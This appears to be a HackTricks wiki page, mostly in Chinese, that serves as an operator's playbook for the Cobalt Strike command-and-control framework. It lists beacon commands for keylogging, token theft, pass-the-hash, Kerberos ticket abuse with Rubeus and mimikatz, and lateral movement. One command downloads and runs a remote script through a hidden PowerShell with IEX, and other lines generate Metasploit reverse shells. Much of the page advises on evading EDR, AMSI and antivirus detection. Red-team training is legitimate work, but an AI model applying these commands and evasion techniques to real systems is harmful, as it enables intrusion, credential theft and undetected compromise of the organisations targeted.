# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit`，然后你可以选择监听位置、使用哪种 beacon（http、dns、smb 等）以及其他选项。

### Peer2Peer Listeners

这些 listeners 的 beacon 不需要直接与 C2 通信，它们可以通过其他 beacon 与其通信。

`Cobalt Strike -> Listeners -> Add/Edit`，然后你需要选择 TCP 或 SMB beacon。

* **TCP beacon 会在所选端口上设置 listener**。要连接到 TCP beacon，请从另一个 beacon 使用命令 `connect <ip> <port>`
* **smb beacon 会使用所选名称在 pipename 上进行监听**。要连接到 SMB beacon，需要使用命令 `link [target] [pipe]`。

### 生成和托管 payloads

#### 在文件中生成 payloads

`Attacks -> Packages ->`

* **`HTMLApplication`** 用于 HTA 文件
* **`MS Office Macro`** 用于包含宏的 office 文档
* **`Windows Executable`** 用于 .exe、.dll 或服务 .exe
* **`Windows Executable (S)`** 用于 **stageless** .exe、.dll 或服务 .exe（stageless 优于 staged，因为 IoCs 更少）

#### 生成和托管 payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` 会生成脚本/可执行文件，从 Cobalt Strike 下载 beacon，支持 bitsadmin、exe、powershell 和 python 等格式。

#### 托管 payloads

如果你已经有要在 web server 上托管的文件，只需转到 `Attacks -> Web Drive-by -> Host File`，然后选择要托管的文件和 web server 配置。

### Beacon 选项

<details>
<summary>Beacon 选项和命令</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### 自定义 implant / Linux Beacons

- 自定义 agent 只需使用 Cobalt Strike Team Server 的 HTTP/S protocol（默认 malleable C2 profile）进行注册/check-in 并接收任务。实现 profile 中定义的相同 URIs/headers/metadata crypto，即可复用 Cobalt Strike UI 进行任务分派和输出处理。<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script（例如 `CustomBeacon.cna`）可以封装非 Windows beacon 的 payload 生成，使 operators 能够选择 listener，并直接从 GUI 生成 ELF payloads。
- 向 Team Server 暴露的 Linux task handlers 示例包括：`sleep`、`cd`、`pwd`、`shell`（执行任意命令）、`ls`、`upload`、`download` 和 `exit`。这些 handlers 对应 Team Server 预期的 task IDs，必须在 server-side 实现，以正确格式返回输出。
- Linux 上的 BOF support 可以通过使用 [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) 在进程内加载 Beacon Object Files 来实现（也支持 Outflank-style BOFs），从而让模块化 post-exploitation 在 implant 的 context/privileges 中运行，而无需创建新进程。<sup>[[2]](#references)[[3]](#references)</sup>
- 在 custom beacon 中嵌入 SOCKS handler，以保持与 Windows Beacons 相同的 pivoting 能力：当 operator 运行 `socks <port>` 时，implant 应打开本地 proxy，使 operator tooling 能够通过被攻陷的 Linux host，访问内部网络。

## Opsec

### Execute-Assembly

**`execute-assembly`** 使用 **sacrificial process**，通过 remote process injection 执行指定程序。该操作非常 noisy，因为要将内容注入进程，需要使用某些 Win APIs，而每个 EDR 都会检查这些 APIs。不过，也有一些 custom tools 可用于在同一进程中加载内容：

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- 在 Cobalt Strike 中也可以使用 BOF (Beacon Object Files)：[https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Aggressor script `https://github.com/outflanknl/HelpColor` 会在 Cobalt Strike 中创建 `helpx` 命令，为命令添加颜色，以指示它们是否为 BOFs（绿色）、是否为 Frok&Run（黄色）等，或者是否为 ProcessExecution、injection 等操作（红色）。这有助于判断哪些命令更加 stealthy。

### 现代进程内 post-execution

Recent versions 在 classic COFF BOF 受到限制时，新增了两种替代方案：

- **Beacon Interpreter** 在 Team Server 上将 C 编译为 intermediate bytecode，并在 Beacon 内嵌的 VM 中执行。该 bytecode 保持为 data，而不是 native executable code，因此无需执行加载 BOF 时通常需要的额外 executable allocation 以及从 RW 到 RX 的 permission transition。Scripts 可以导入 Beacon API，并声明 BOF-style Dynamic Function Resolution (DFR) prototypes。
- **BOF-PE** 在当前 Beacon 中加载完整的 EXE 或 DLL。该格式支持 normal PE imports、exception handling、更丰富的 C++ 和 external libraries，同时保留 Beacon API。与小型 COFF BOF 相比，它的开销更大，因此只有在额外 runtime 有用时才应选择它。
```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```
这些机制会减少与 loader 相关的信号，但不会减少由脚本行为或 Windows API 调用产生的 telemetry。<sup>[[8]](#references)</sup>

### 伪装成用户

你可以检查以下事件，例如 `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`：

- Security EID 4624 - 检查所有交互式登录，以了解通常的工作时间。
- System EID 12,13 - 检查关机/启动/睡眠的频率。
- Security EID 4624/4625 - 检查传入的有效/无效 NTLM 尝试。
- Security EID 4648 - 当使用明文凭据登录时会创建此事件。如果由某个进程生成，则该二进制文件可能在配置文件或代码中以明文形式包含凭据。

使用 cobalt strike 的 `jump` 时，最好使用 `wmi_msbuild` 方法，使新进程看起来更合法。

### 使用计算机账户

防御者通常会检查由用户生成的异常行为，并且**将服务账户和类似 `*$` 的计算机账户排除在监控之外**。你可以使用这些账户执行横向移动或权限提升。

### 使用 stageless payloads

Stageless payloads 比 staged payloads 产生的噪声更少，因为它们不需要从 C2 server 下载第二阶段。这意味着初始连接之后不会产生任何网络流量，因此不太可能被基于网络的防御措施检测到。

### Tokens & Token Store

窃取或生成 tokens 时要小心，因为 EDR 可能会枚举 thread tokens，并检测到进程中存在**属于其他用户的 token**，甚至是 SYSTEM 的 token。

这允许**按 beacon 存储 tokens**，因此不需要反复窃取相同的 token。这对于横向移动，或需要多次使用被窃取的 token 时很有用：

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

进行横向移动时，通常**窃取 token 比生成新 token**或执行 pass the hash attack 更好。

### Guardrails

Cobalt Strike 有一项名为 **Guardrails** 的功能，可帮助阻止使用某些可能被防御者检测到的命令或操作。Guardrails 可以配置为阻止特定命令，例如 `make_token`、`jump`、`remote-exec`，以及其他通常用于横向移动或权限提升的命令。

此外，repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) 还包含一些检查项和思路，你可以在执行 payload 之前加以考虑。

### Tickets 加密

在 AD 中，要注意 tickets 的加密方式。默认情况下，一些工具会对 Kerberos tickets 使用 RC4 加密，这比 AES 加密不安全，而默认情况下，较新的环境会使用 AES。监控弱加密算法的防御者可以检测到这一点。

### 避免默认值

使用 Cobalt Stricke 时，默认情况下 SMB pipes 的名称将为 `msagent_####` 和 `"status_####"`。请修改这些名称。可以使用以下命令从 Cobal Strike 中检查现有 pipes 的名称：`ls \\.\pipe\`

此外，在 SSH sessions 中会创建名为 `\\.\pipe\postex_ssh_####` 的 pipe。使用 `set ssh_pipename "<new_name>";` 修改它。

在 post-exploitation attack 中，pipes `\\.\pipe\postex_####` 也可以通过 `set pipename "<new_name>"` 修改。

在 Cobalt Strike profiles 中，你还可以修改以下内容：

- 避免使用 `rwx`
- process injection 的行为方式（将在 `process-inject {...}` block 中使用哪些 APIs）
- `"fork and run"` 的工作方式（在 `post-ex {…}` block 中）
- sleep 时间
- 加载到内存中的 binaries 的最大大小
- `stage {...}` block 中的 memory footprint 和 DLL 内容
- 网络流量

### Sleepmask 和 BeaconGate

Sleepmask 会在 Beacon 休眠时转换 Beacon 及其跟踪的 heap allocations，然后在执行 task 时恢复它们。当前版本提供了一个具有 evasive 特性的默认实现，但当 memory layout、allocation 或 call-stack 要求不同时，自定义 Sleepmask BOFs 仍然很有用。从 4.13 版本开始，默认 Sleepmask 还会 spoof 通过 BeaconGate 代理的 APIs 的 return address。<sup>[[8]](#references)</sup>

**BeaconGate** 将这一设计扩展到 `Sleep` 之外：选定的 WinAPI calls 会表示为 `FUNCTION_CALL` structures，并转发到 Sleepmask BOF，由后者在执行 call 时隐藏 Beacon。Profile 可以对一组 APIs（`Comms`、`Core`、`Cleanup` 或 `All`）启用 gating，也可以只对单个 APIs 启用：<sup>[[9]](#references)</sup>
```text
stage {
set sleep_mask "true";
set syscall_method "Indirect";

beacon_gate {
VirtualAlloc;       # Routed through BeaconGate
VirtualAllocEx;
InternetConnectA;
}
}
```
对于 `beacon_gate` 下列出的 API，gate 的优先级高于 `syscall_method`；未列出的 API 仍可使用已配置的 syscall method。`beacon_gate disable` 和 `beacon_gate enable` 可在运行时切换该功能。不要盲目启用 `All`：诸如 `ps` 之类的命令会反复调用 `OpenProcess`/`CloseHandle`，当每次调用都对 Beacon 进行 mask 和 unmask 时，可能导致 CPU 突增。Sleepmask-VS 提供了模拟的 Beacon/Sleepmask 状态，可用于调试自定义 gate，而无需通过 live implant 反复测试。<sup>[[9]](#references)</sup>

### Noisy proc injections

将代码注入进程时通常会产生很大的噪声，这是因为**普通进程通常不会执行此操作，而且执行该操作的方式非常有限**。因此，它可能会被基于行为的检测系统发现。此外，EDR 还可能扫描网络，检测包含**不在磁盘上的代码的线程**（尽管使用 JIT 的浏览器等进程通常会出现这种情况）。示例：[https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID 和 PPID 关系

生成新进程时，维护进程之间**正常的父子关系**非常重要，以避免被检测。如果 svchost.exec 正在执行 iexplorer.exe，这看起来会很可疑，因为在正常的 Windows 环境中，svchost.exe 并不是 iexplorer.exe 的父进程。

在 Cobalt Strike 中生成新的 beacon 时，默认会创建一个使用 **`rundll32.exe`** 运行新 listener 的进程。这种方式的隐蔽性不高，很容易被 EDR 检测到。此外，`rundll32.exe` 在不带任何参数的情况下运行，会使其更加可疑。

使用以下 Cobalt Strike 命令，可以指定用于生成新 beacon 的其他进程，从而降低被检测的可能性：
```bash
spawnto x86 svchost.exe
```
You can aso change this setting **`spawnto_x86` and `spawnto_x64`** in a profile.

### Proxying attackers traffic

攻击者有时需要能够在本地运行 tools，即使是在 linux 机器上，并让受害者的流量到达该 tool（例如 NTLM relay）。

此外，有时进行 pass-the.hash 或 pass-the-ticket attack 时，攻击者将该 hash 或 ticket **添加到自己本地的 LSASS 进程中**，然后从中进行 pivot，会比修改受害者机器上的 LSASS 进程更加 stealthier。

但是，你需要对**生成的流量**保持谨慎，因为你可能会从 backdoor 进程发送不常见的流量（kerberos？）。为此，你可以 pivot 到 browser 进程（不过将自己注入进程可能会被发现，因此需要考虑一种 stealth 的方式来完成此操作）。


### 避免 AV

#### AV/AMSI/ETW Bypass

查看页面：


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

通常在 `/opt/cobaltstrike/artifact-kit` 中可以找到代码和 payloads 的预编译 templates（位于 `/src-common`），这些 payloads 是 cobalt strike 用来生成 binary beacons 的。

使用 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) 检查生成的 backdoor（或仅检查编译后的 template），可以找到是什么导致 defender 触发。通常是一个字符串。因此，你可以直接修改生成 backdoor 的代码，使该字符串不出现在最终的 binary 中。

修改代码后，只需从同一目录运行 `./build.sh`，然后将 `dist-pipe/` 文件夹复制到 Windows client 中的 `C:\Tools\cobaltstrike\ArtifactKit`。
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
别忘了加载 aggressive script `dist-pipe\artifact.cna`，以指示 Cobalt Strike 使用我们指定的磁盘资源，而不是已加载的资源。

#### Resource Kit

ResourceKit 文件夹包含 Cobalt Strike 基于脚本的 payload 模板，包括 PowerShell、VBA 和 HTA。

将 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) 与这些模板结合使用，可以找出 Defender（此处为 AMSI）不接受的内容并进行修改：
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
修改检测到的行后，可以生成一个不会被捕获的模板。

不要忘记加载 aggressive script `ResourceKit\resources.cna`，以指示 Cobalt Strike 使用我们指定的磁盘资源，而不是已加载的资源。

#### Function hooks | Syscall

Function hooking 是 ERDs 检测 malicious activity 的一种非常常见的方法。Cobalt Strike 允许你通过使用 **syscalls** 替代标准 Windows API 调用来绕过这些 hooks：使用 **`None`** config；或者通过 **`Direct`** setting 使用函数的 `Nt*` 版本；也可以在 malleable profile 中使用 **`Indirect`** option，直接跳过 `Nt*` 函数。根据系统的不同，某个 option 可能比其他 option 更 stealth。

可以在 profile 中设置此项，也可以使用 **`syscall-method`** command。

不过，这也可能产生较明显的痕迹。

Cobalt Strike 提供的一种绕过 function hooks 的 option，是使用以下工具移除这些 hooks：[**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof)。

你也可以使用 [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) 或 [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector) 检查哪些 functions 已被 hooked。




<details>
<summary>Misc Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>



## References

- [1] [Cobalt Strike Linux Beacon（custom implant PoC）](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader 与 Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF 模板](https://github.com/outflanknl/nix_bof_template)
- [4] [Unit42 对 Cobalt Strike 元数据加密的分析](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [SANS ISC 关于 Cobalt Strike 流量的日志](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13：Lost In Translation](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10：Through the BeaconGate](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
